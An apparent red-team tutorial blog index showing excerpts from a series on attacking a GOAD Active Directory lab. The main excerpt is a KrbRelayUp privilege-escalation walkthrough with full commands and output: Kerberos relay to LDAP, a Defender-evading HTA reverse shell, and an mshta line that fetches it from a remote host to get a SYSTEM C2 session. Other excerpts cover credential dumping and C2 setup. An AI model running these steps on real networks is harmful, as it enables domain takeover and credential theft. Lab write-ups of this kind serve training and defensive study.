<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Red Mercury</title>
  <meta name="author" content="Mostafa Noureldin">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="Red Mercury"/>

  
    <meta property="og:image" content=""/>
  

  
  
  
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="https://mmnoureldin.github.io/Red-Team/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="https://mmnoureldin.github.io/Red-Team/">Red Mercury</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="https://mmnoureldin.github.io/Red-Team/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="https://mmnoureldin.github.io/Red-Team/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="https://mmnoureldin.github.io/Red-Team/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="https://mmnoureldin.github.io/Red-Team/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>Red Mercury<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-bolt blink-slow" style="color:orange"></i>

		Just Spark !

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="https://mmnoureldin.github.io/Red-Team/2023/04/03/Privilege-Escalation-KRBRelayup/" >2.b Privilege Escalation - KRBRelayup</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-04-03  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This post is built on what we have acheieved on our last post <a href="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/" title="1. Gaining Initial Foothold">1. Gaining Initial Foothold</a>.</p>
<p>In this post we will create a machine account then relay kerberos authentication over LDAP to a domain controller where signing is disabled to add the newly created machine account to the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute of our local machine, then perform the resource based constrined delegation attack where we will be able to gain a system level access.</p>
<img src="https://mmnoureldin.github.io/Red-Team/2023/04/03/Privilege-Escalation-KRBRelayup/mindmap_krbrelay.png" class="">


<h2 id="Preqreuists"><a href="#Preqreuists" class="headerlink" title="Preqreuists"></a>Preqreuists</h2><ul>
<li><p>LDAP signing is off.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q  crackmapexec  ldap 192.168.24.11 -u hodor -p hodor -d north.sevenkingdoms.local -M ldap-signing</span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor </span><br><span class="line">LDAP-SIG... 192.168.24.11   389    WINTERFELL       LDAP signing is NOT enforced on 192.168.24.11</span><br></pre></td></tr></table></figure>
</li>
<li><p>Ability to add machine to the domain.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains -q  crackmapexec ldap 192.168.24.11 -u hodor -p hodor -d north.sevenkingdoms.local -M MAQ</span><br><span class="line"></span><br><span class="line">SMB         192.168.24.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        192.168.24.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor </span><br><span class="line">MAQ         192.168.24.11   389    WINTERFELL       [*] Getting the MachineAccountQuota</span><br><span class="line">MAQ         192.168.24.11   389    WINTERFELL       MachineAccountQuota: 10</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><ol>
<li><p>Add Computer account, RBCD rights and relay kerberos to LDAP.</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sliver (PURPLE_SOOT) &gt; krbrelayup relay -Domain north.sevenkingdoms.local -CreateNewComputerAccount -ComputerName fakeone$ -ComputerPassword P@ssw0rd</span><br><span class="line"></span><br><span class="line">[*] krbrelayup output:</span><br><span class="line">KrbRelayUp - Relaying you to SYSTEM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Computer account &quot;fakeone$&quot; added with password &quot;P@ssw0rd&quot;</span><br><span class="line">[+] Rewriting function table</span><br><span class="line">[+] Rewriting PEB</span><br><span class="line">[+] Init COM server</span><br><span class="line">[+] Register COM server</span><br><span class="line">[+] Forcing SYSTEM authentication</span><br><span class="line">[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...</span><br><span class="line">[+] LDAP session established</span><br><span class="line">[+] RBCD rights added successfully</span><br><span class="line">[+] Run the spawn method for SYSTEM shell:</span><br><span class="line">    ./KrbRelayUp spawn -d north.sevenkingdoms.local -cn fakeone$ -cp P@ssw0rd</span><br></pre></td></tr></table></figure>


</li>
<li><p>Generate an <code>hta</code> reverse shell using Metasploit.</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf6 evasion(windows/windows_defender_js_hta) &gt; run </span><br><span class="line"></span><br><span class="line">[+] shell.hta stored at /home/kali/.msf4/local/shell.hta</span><br><span class="line">msf6 evasion(windows/windows_defender_js_hta) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (evasion/windows/windows_defender_js_hta):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   FILENAME  shell.hta        yes       Filename for the evasive file (default: random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/custom/reverse_winhttps):</span><br><span class="line"></span><br><span class="line">   Name            Current Setting  Required  Description</span><br><span class="line">   ----            ---------------  --------  -----------</span><br><span class="line">   EXITFUNC        process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST           192.168.24.138   yes       The local listener hostname</span><br><span class="line">   LPORT           443              yes       The local listener port</span><br><span class="line">   LURI            /hello.woff      no        The HTTP Path</span><br><span class="line">   SHELLCODE_FILE                   no        Shellcode bin to launch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Evasion target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Microsoft Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br></pre></td></tr></table></figure>


</li>
<li><p>Initiate RBCD &amp; obtain system shell.</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">sliver (PURPLE_SOOT) &gt; krbrelayup spawn -d north.sevenkingdoms.local -cn fakeone$ -cp P@ssw0rd -sc \&quot;cmd.exe /C &#x27;mshta.exe https://fake-host.com/shell.hta&#x27;\&quot; -s mmm</span><br><span class="line"></span><br><span class="line">[*] krbrelayup output:</span><br><span class="line">KrbRelayUp - Relaying you to SYSTEM</span><br><span class="line"></span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line">[+] Building S4U2self </span><br><span class="line">[*] Using domain controller: winterfell.north.sevenkingdoms.local (192.168.24.11)</span><br><span class="line">[+] Sending S4U2self request to 192.168.24.11:88</span><br><span class="line">[+] S4U2self success!</span><br><span class="line">[+] Got a TGS for &#x27;Administrator&#x27; to &#x27;fakeone$@NORTH.SEVENKINGDOMS.LOCAL&#x27;</span><br><span class="line">[+] Impersonating user &#x27;Administrator&#x27; to target SPN &#x27;HOST/CASTELBLACK&#x27;</span><br><span class="line">[+] Building S4U2proxy request for service: &#x27;HOST/CASTELBLACK&#x27;</span><br><span class="line">[*] Using domain controller: winterfell.north.sevenkingdoms.local (192.168.24.11)</span><br><span class="line">[+] Sending S4U2proxy request to domain controller 192.168.24.11:88</span><br><span class="line">[+] S4U2proxy success!</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line">[+] Using ticket to connect to Service Manger</span><br><span class="line">[+] AcquireCredentialsHandleHook called for package N</span><br><span class="line">[+] Changing to Kerberos package</span><br><span class="line">[+] InitializeSecurityContextHook called for target H</span><br><span class="line">[+] InitializeSecurityContext status = 0x00090312</span><br><span class="line">[+] InitializeSecurityContextHook called for target H</span><br><span class="line">[+] InitializeSecurityContext status = 0x00000000</span><br><span class="line">[+] mmm Service created</span><br><span class="line">[+] mmm Service started</span><br><span class="line">[+] Clean-up done</span><br><span class="line"></span><br><span class="line">[*] Session 61e64f68 SUCCESSFUL_FOREBEAR - tcp([::1]:56534)-&gt;192.168.24.22 (castelblack) - windows/amd64 - Sun, 02 Apr 2023 02:01:29 EET</span><br><span class="line"></span><br></pre></td></tr></table></figure>


</li>
<li><p>Serving the <code>hta</code> shell.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/kali/.msf4/local/shell.hta     </span><br><span class="line">$ python3 -m http.server 10443</span><br><span class="line">Serving HTTP on 0.0.0.0 port 10443 (http://0.0.0.0:10443/) ...</span><br><span class="line">127.0.0.1 - - [02/Apr/2023 02:00:51] <span class="string">&quot;GET /shell.hta HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</li>
<li><p>Checking the obtained session privileges.</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sliver (PURPLE_SOOT) &gt; use 61e64f68</span><br><span class="line"></span><br><span class="line">[*] Active session SUCCESSFUL_FOREBEAR (61e64f68-6392-43cf-b945-1b9b4f5b9a2a)</span><br><span class="line"></span><br><span class="line">sliver (SUCCESSFUL_FOREBEAR) &gt; info</span><br><span class="line"></span><br><span class="line">        Session ID: 61e64f68-6392-43cf-b945-1b9b4f5b9a2a</span><br><span class="line">              Name: SUCCESSFUL_FOREBEAR</span><br><span class="line">          Hostname: castelblack</span><br><span class="line">              UUID: b2734d56-2bb6-d2e4-e42d-56bcc5a0d285</span><br><span class="line">          Username: NT AUTHORITY\SYSTEM</span><br><span class="line">               UID: S-1-5-18</span><br><span class="line">               GID: S-1-5-18</span><br><span class="line">               PID: 5312</span><br><span class="line">                OS: windows</span><br><span class="line">           Version: Server 2016 build 17763 x86_64</span><br><span class="line">            Locale: en-US</span><br><span class="line">              Arch: amd64</span><br><span class="line">         Active C2: https://192.168.24.138</span><br><span class="line">    Remote Address: tcp([::1]:56534)-&gt;192.168.24.22</span><br><span class="line">         Proxy URL: </span><br><span class="line">Reconnect Interval: 1m0s</span><br><span class="line">     First Contact: Sun Apr  2 02:01:29 EET 2023 (28m27s ago)</span><br><span class="line">      Last Checkin: Sun Apr  2 02:29:54 EET 2023 (2s ago)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Observations"><a href="#Observations" class="headerlink" title="Observations"></a>Observations</h2><ol>
<li><p>Machine account created.</p>
<img src="https://mmnoureldin.github.io/Red-Team/2023/04/03/Privilege-Escalation-KRBRelayup/image-20230402150915102.png" class="">
</li>
<li><p>Machine account password was reset.</p>
<img src="https://mmnoureldin.github.io/Red-Team/2023/04/03/Privilege-Escalation-KRBRelayup/image-20230402150947837.png" class="">
</li>
<li><p>TGT was requested for the newly created machine account - s4u2self.</p>
<img src="https://mmnoureldin.github.io/Red-Team/2023/04/03/Privilege-Escalation-KRBRelayup/image-20230402151413344.png" class="">
</li>
<li><p>TGS request to access the exploited target transited from the new machine account - s4u2proxy.</p>
<img src="https://mmnoureldin.github.io/Red-Team/2023/04/03/Privilege-Escalation-KRBRelayup/image-20230402151717957.png" class="">
</li>
<li><p>On the exploited local system, there will be a successfull login for the domain administrator from 127.0.0.1.</p>
<img src="https://mmnoureldin.github.io/Red-Team/2023/04/03/Privilege-Escalation-KRBRelayup/image-20230402153246981.png" class="">
</li>
<li><p>As we escalated our privilege through an <code>hta</code> reverse shell, there will be an evidence for this too on the local system.</p>
<img src="https://mmnoureldin.github.io/Red-Team/2023/04/03/Privilege-Escalation-KRBRelayup/image-20230402153758916.png" class=""></li>
</ol>

	
	</div>
  <a type="button" href="https://mmnoureldin.github.io/Red-Team/2023/04/03/Privilege-Escalation-KRBRelayup/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="https://mmnoureldin.github.io/Red-Team/2023/03/08/Credentials-Access/" >3. Credentials Access</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-03-08  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Through this post we are building on the previous posts, where we had achieved an initial access and system level privilege escalation on one of the targets.<br>This post will introduce different techniques for credentials access.</p>
<img src="https://mmnoureldin.github.io/Red-Team/2023/03/08/Credentials-Access/mindmap.png" class="">

<h2 id="Memory-dumping"><a href="#Memory-dumping" class="headerlink" title="Memory dumping"></a>Memory dumping</h2><p>After gaining <code>system</code> user privilege on <code>castelblack</code> we can dump credentials from memory using <code>sharpkatz</code>:</p>
	
	</div>
  <a type="button" href="https://mmnoureldin.github.io/Red-Team/2023/03/08/Credentials-Access/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="https://mmnoureldin.github.io/Red-Team/2023/02/24/Privilege-Escalation-Printspoofer/" >2.a Privilege Escalation - Printspoofer</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-02-24  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This post is built on what we have acheieved on our last post <a href="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/" title="1. Gaining Initial Foothold">1. Gaining Initial Foothold</a>.</p>
<p>We will be able to spoof a printer named pipe to escalate our privileges to system user.</p>
<h2 id="Migration"><a href="#Migration" class="headerlink" title="Migration"></a>Migration</h2><p>After gaining the intial access on the target, we had to migrate to some stable proccess other than our <code>W3wp.exe</code> one, this should be done by selecting an appropriate process from the target I cooshed <code>explorer.exe</code>.</p>
<p>I’m using <a href="https://github.com/mmnoureldin/ExecSploit" title="" target="">ExecSploit</a> a tool that I wrote as a wrapper for <code>SharpSploit</code> to create the <code>explorer.exe</code> process.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[*] Command executed successfully</span><br><span class="line"></span><br><span class="line">sliver (NORTHERN_CONCRETE) &gt; ps</span><br><span class="line"></span><br><span class="line"> Pid    Ppid   Owner                        Arch     Executable          Session </span><br><span class="line">====== ====== ============================ ======== =================== =========</span><br><span class="line"> 0      0                                            [System Process]    -1      </span><br><span class="line"> 4      0                                            System              -1      </span><br><span class="line"> 68     4                                            Registry            -1      </span><br><span class="line"> 496    4                                            smss.exe            -1      </span><br><span class="line"> 604    596                                          csrss.exe           -1      </span><br><span class="line"> 704    696                                          csrss.exe           -1      </span><br><span class="line">     </span><br><span class="line"> 4260   800                                          NisSrv.exe          -1      </span><br><span class="line"> 3796   2580   IIS APPPOOL\DefaultAppPool   x86_64   w3wp.exe            0       </span><br><span class="line"> 1072   800                                          winlogbeat.exe      -1      </span><br><span class="line"> 4820   800                                          WmiApSrv.exe        -1      </span><br><span class="line"> 1004   800                                          svchost.exe         -1      </span><br><span class="line"> 1168   800                                          svchost.exe         -1      </span><br><span class="line"> 3592   800                                          svchost.exe         -1      </span><br><span class="line"> 3356   3796   IIS APPPOOL\DefaultAppPool   x86_64   explorer.exe        0       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">⚠️  Security Product(s): Sysmon64, Windows Defender</span><br><span class="line"></span><br></pre></td></tr></table></figure>
	
	</div>
  <a type="button" href="https://mmnoureldin.github.io/Red-Team/2023/02/24/Privilege-Escalation-Printspoofer/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/" >1. Gaining Initial Foothold</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-02-13  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>In this post we are building on the previous post <a href="https://mmnoureldin.github.io/Red-Team/2023/02/01/Basic-Red-Team-Infrastructure/" title="0. Basic Red Team Infrastructure">0. Basic Red Team Infrastructure</a>. We are targeting initial access through an exposed file upload form.</p>
<h2 id="Diagram"><a href="#Diagram" class="headerlink" title="Diagram"></a>Diagram</h2><img src="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/Initial_access.png" class="">


<h2 id="Players"><a href="#Players" class="headerlink" title="Players"></a>Players</h2><ul>
<li>Attacker machine: 192.168.25.128</li>
<li>Redirector machine: 192.168.25.138</li>
<li>Firewall: 192.168.24.138</li>
<li>Vicitm: <a href="https://github.com/Orange-Cyberdefense/GOAD" title="" target="">GOAD Castelblack</a>.</li>
</ul>
	
	</div>
  <a type="button" href="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="https://mmnoureldin.github.io/Red-Team/2023/02/01/Basic-Red-Team-Infrastructure/" >0. Basic Red Team Infrastructure</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-02-01  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This post is about how to install a red team basic infrastructure using Apache web server and Sliver C2 framework from BishopFox. It is meant as the kickoff post for a series of tutorial posts on how to perform red teaming excercises from my experiments.</p>
<h2 id="Diagram"><a href="#Diagram" class="headerlink" title="Diagram"></a>Diagram</h2><p>Through this post I will use a network setup like the one in the below image.</p>
<img src="https://mmnoureldin.github.io/Red-Team/2023/02/01/Basic-Red-Team-Infrastructure/image-20230131164406408.png" class="">

<h2 id="Setup-Apache-Redirector"><a href="#Setup-Apache-Redirector" class="headerlink" title="Setup Apache Redirector"></a>Setup Apache Redirector</h2><p>Redirectors are used as a protection for team server, it shouldn’t reach team server directly in anyway. Traffic from victim corporate should land on the redirector then, redirector will decided how to forward it as per the configured rules.</p>
	
	</div>
  <a type="button" href="https://mmnoureldin.github.io/Red-Team/2023/02/01/Basic-Red-Team-Infrastructure/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/credentials-access/">credentials access<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/infrastructure/">infrastructure<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/intial-access/">intial access<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/privilege-escalation/">privilege escalation<span>2</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/categories/red-team/">red team<span>5</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/kerberos-relay/">kerberos relay<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/Sliver/">Sliver<span>3</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/T1558-003/">T1558.003<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/redirector/">redirector<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/Delegations/">Delegations<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/hta/">hta<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/krbrelayup/">krbrelayup<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/AV/">AV<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/Spool-sample/">Spool sample<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/bruteforce/">bruteforce<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/T1055/">T1055<span>2</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/file-upload/">file upload<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/lsass/">lsass<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/ssh-tunnel/">ssh tunnel<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/metasploit/">metasploit<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/mshta/">mshta<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/Kerberoasting/">Kerberoasting<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/T1110/">T1110<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/Print-Spoofer/">Print Spoofer<span>1</span></a></li>
		
			<li><a href="https://mmnoureldin.github.io/Red-Team/tags/sharpkatz/">sharpkatz<span>1</span></a></li>
		
		
		   <li><a href="/tags">...<span>37</span></a></li>
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="https://mmnoureldin.github.io/Red-Team/2023/04/03/Privilege-Escalation-KRBRelayup/" ><i class="fa fa-file-o"></i>2.b Privilege Escalation - ...</a>
      </li>
    
      <li>
        <a href="https://mmnoureldin.github.io/Red-Team/2023/03/08/Credentials-Access/" ><i class="fa fa-file-o"></i>3. Credentials Access</a>
      </li>
    
      <li>
        <a href="https://mmnoureldin.github.io/Red-Team/2023/02/24/Privilege-Escalation-Printspoofer/" ><i class="fa fa-file-o"></i>2.a Privilege Escalation - ...</a>
      </li>
    
      <li>
        <a href="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/" ><i class="fa fa-file-o"></i>1. Gaining Initial Foothold</a>
      </li>
    
      <li>
        <a href="https://mmnoureldin.github.io/Red-Team/2023/02/01/Basic-Red-Team-Infrastructure/" ><i class="fa fa-file-o"></i>0. Basic Red Team Infrastru...</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="false"></i><a href="https://github.com/mmnoureldin" title="" target="_blank"]);">mnoureldin github.</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2023 Mostafa Noureldin's Blog
  
       
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="https://mmnoureldin.github.io/Red-Team/js/jquery.imagesloaded.min.js"></script>
<script src="https://mmnoureldin.github.io/Red-Team/js/gallery.js"></script>
